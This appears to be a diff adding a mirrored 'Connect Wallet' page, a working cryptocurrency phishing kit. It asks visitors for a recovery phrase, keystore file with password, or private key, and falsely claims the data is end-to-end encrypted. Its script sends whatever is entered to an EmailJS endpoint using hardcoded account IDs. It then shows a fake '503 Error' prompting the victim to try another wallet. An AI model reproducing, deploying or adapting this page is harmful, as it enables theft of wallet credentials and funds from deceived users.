@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Mirrored from vistasync.netlify.app/wallets/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 06 Nov 2022 23:19:12 GMT --><!-- Added by HTTrack -->
+
+<head><!-- /Added by HTTrack -->
+
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="https://res.cloudinary.com/dmnub1pdp/image/upload/v1733966247/logo_nlq3ts.svg"
+    type="image/x-icon">
+  <title>Connect Wallet</title>
+
+  <!-- font awesome link -->
+  <script src="js/78d167673c.js" crossorigin="anonymous"></script>
+
+  <!-- google fonts link -->
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&amp;display=swap"
+    rel="stylesheet">
+
+  <!-- bootstrap css link -->
+  <!-- CSS only -->
+  <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&display=swap");
+
+    * {
+      font-family: "Poppins", sans-serif;
+    }
+
+    body {
+      background-color: #0c0e29;
+      /* background-image: linear-gradient(to bottom, #000000 10%, #0c0e29 100%); */
+    }
+
+    textarea,
+    input {
+      color: #141b29 !important;
+      font-weight: 600 !important;
+      font-size: 13px !important;
+    }
+
+    .formpage {
+      margin-top: 10rem;
+    }
+
+    .nav-link {
+      color: #fff;
+      font-weight: 600;
+    }
+
+    .nav-link:hover {
+      color: #0c0e29;
+    }
+
+    .nav-item {
+      -webkit-transition: 300ms linear;
+      transition: 300ms linear;
+    }
+
+    .nav-item:hover {
+      background-color: #fff;
+      color: #0c0e29 !important;
+    }
+
+    .tab-content {
+      background-color: #fff;
+      padding-top: 2rem;
+      padding-left: 1rem;
+      padding-right: 1rem;
+      padding-bottom: 2rem;
+      border-radius: 2px;
+    }
+
+    .formpage-header h1 {
+      color: #fff !important;
+      font-weight: 500;
+      margin-bottom: 4rem;
+      margin-top: -4rem !important;
+    }
+
+    .formpage-header h6 {
+      color: #fff;
+      font-size: 12px;
+      margin-bottom: 4rem;
+      margin-top: -3rem !important;
+    }
+
+    .active {
+      color: #0c0e29 !important;
+    }
+
+    .form-text {
+      margin-top: 1rem;
+    }
+
+    .form-label {
+      color: #89898a;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    select {
+      color: #0c0e29 !important;
+      font-weight: 600 !important;
+      font-size: 13px !important;
+    }
+
+    .btn-primary {
+      background-color: #0c0e29 !important;
+      border: none !important;
+    }
+
+    .btn-primary:hover,
+    .btn-primary:focus,
+    .btn-primary:active {
+      background-color: #0c0e29 !important;
+    }
+
+    @media screen and (max-width: 768px) {
+      .formpage-header {
+        margin-top: -4.5rem !important;
+      }
+
+      .form-box {
+        margin-top: -1rem;
+      }
+    }
+
+    @media screen and (max-width: 413px) {
+      .nav-link {
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="formpage">
+    <div class="content-box-md">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="text-center formpage-header">
+              <h1>Proceed</h1>
+              <h6>
+                NB: All information are end-to end-encrypted. We do not share
+                data and activity sessions with any other company.
+              </h6>
+            </div>
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="col-md-2"></div>
+          <div class="col-md-8">
+            <div class="form-box">
+              <ul class="nav nav-tabs" id="myTab" role="tablist">
+                <li class="nav-item" role="presentation">
+                  <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home"
+                    type="button" role="tab" aria-controls="home" aria-selected="true">
+                    Phrase
+                  </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                  <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button"
+                    role="tab" aria-controls="profile" aria-selected="false">
+                    Keystore JSON
+                  </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                  <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact" type="button"
+                    role="tab" aria-controls="contact" aria-selected="false">
+                    Private Key
+                  </button>
+                </li>
+              </ul>
+              <div class="tab-content" id="myTabContent">
+                <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
+                  <form name="contact" id="phrase">
+                    <input type="hidden" name="csrfmiddlewaretoken"
+                      value="v0WPu76ybaQDs1y6C1za9Y8lcunbcbYTTHTIQK7SGNWL0GpPmmoTvOY5DgYQfbYk">
+
+                    <input type="hidden" name="form-name" value="contact">
+                    <div class="form-group mb-3">
+                      <select style="
+                            color: #0150b8;
+                            font-weight: 600;
+                            margin-bottom: 0.7rem;
+                          " type="text" name="wallet-name" class="form-select" aria-label="Default select example">
+                        <option selected="">Wallet Selected</option>
+                      </select>
+                      <label class="form-label">Recovery Phrase</label>
+
+
+
+                      <textarea name="phrase" cols="40" rows="10" class="form-control" maxlength="500" required=""
+                        id="id_phrase"></textarea>
+
+
+                      <div id="" class="form-text">
+                        Typically 12 (sometimes 24) words separated by a
+                        single space.
+                      </div>
+                    </div>
+                    <button style="background-color: #0150b8" type="submit" class="btn btn-primary">
+                      Proceed
+                    </button>
+                  </form>
+                </div>
+                <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                  <form method="post" name="contact" id="keystore">
+                    <input type="hidden" name="csrfmiddlewaretoken"
+                      value="v0WPu76ybaQDs1y6C1za9Y8lcunbcbYTTHTIQK7SGNWL0GpPmmoTvOY5DgYQfbYk">
+                    <input type="hidden" name="form-name" value="contact">
+                    <div class="form-group mb-3">
+                      <select style="
+                            color: #0150b8;
+                            font-weight: 600;
+                            margin-bottom: 0.7rem;
+                          " type="text" name="wallet-name" class="form-select" aria-label="Default select example">
+                        <option selected="">Trust Wallet</option>
+                      </select>
+                      <label class="form-label">Keystore</label>
+                      <textarea name="words" cols="40" rows="10" style="height: 10rem; color: #0150b8"
+                        class="form-control s90 h28 custom_f_all" maxlength="500" required="" id="id_words"></textarea>
+
+
+
+
+
+
+                      <input type="password" name="password" placeholder="Password" aria-label="Username"
+                        class="form-control" required="" id="id_password">
+
+
+                      <div id="" class="form-text">
+                        Several lines of text beginning with “{…}” plus the
+                        password you used for encryption.
+                      </div>
+                    </div>
+                    <button style="background-color: #0150b8" type="submit" class="btn btn-primary">
+                      Proceed
+                    </button>
+                  </form>
+                </div>
+                <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
+                  <form method="post" name="contact" id="privatekey">
+                    <input type="hidden" name="csrfmiddlewaretoken"
+                      value="v0WPu76ybaQDs1y6C1za9Y8lcunbcbYTTHTIQK7SGNWL0GpPmmoTvOY5DgYQfbYk">
+                    <input type="hidden" name="form-name" value="contact">
+                    <div class="form-group mb-3">
+                      <select style="
+                            color: #0150b8;
+                            font-weight: 600;
+                            margin-bottom: 0.7rem;
+                          " type="text" name="wallet-name" class="form-select" aria-label="Default select example">
+                        <option selected="">Trust Wallet</option>
+                      </select>
+                      <label class="form-label">Private Key</label>
+
+
+
+                      <textarea name="phrase" cols="40" rows="10" class="form-control" maxlength="500" required=""
+                        id="id_phrase"></textarea>
+
+
+                      <div id="" class="form-text">
+                        Before you enter private key, we recommend you connect
+                        to the internet.
+                      </div>
+                    </div>
+                    <button style="background-color: #0150b8" type="submit" class="btn btn-primary">
+                      Proceed
+                    </button>
+                  </form>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-2"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- bootstrap js link -->
+  <!-- JavaScript Bundle with Popper -->
+  <script src="js/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+  <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+  <script>
+    let phrase = document.getElementById("phrase");
+    let privateKey = document.getElementById("privatekey");
+    let keystore = document.getElementById("keystore");
+
+    function handleSubmit(event) {
+      event.preventDefault();
+      console.log("Submitted");
+      const formData = new FormData(event.target);
+      const formProps = Object.fromEntries(formData);
+      let val = "";
+      if (formProps.phrase) {
+        val = formProps.phrase;
+      } else if (formProps.privateKey) {
+        val = formProps.privateKey;
+      } else {
+        val = formProps.words;
+      }
+
+      var data = {
+        service_id: "service_d5qigxs",
+        template_id: "template_7bqxeaa",
+        user_id: "I-7q0Bs-ilK3rFcWj",
+        template_params: {
+          phrase: val,
+        },
+      };
+
+      fetch("https://api.emailjs.com/api/v1.0/email/send", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+      })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Network response was not ok');
+          }
+          console.log("Your mail is sent!");
+          console.log(val);
+          alert("503 Error, if this persists kindly sync another wallet and try again or contact admin");
+        })
+        .catch(error => {
+          alert("Oops... " + JSON.stringify(error));
+        });
+    }
+    phrase.addEventListener("submit", handleSubmit);
+    privateKey.addEventListener("submit", handleSubmit);
+    keystore.addEventListener("submit", handleSubmit);
+  </script>
+
+
+
+
+</body>
+<!-- Mirrored from vistasync.netlify.app/wallets/import/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 06 Nov 2022 23:19:12 GMT -->
+
+</html>
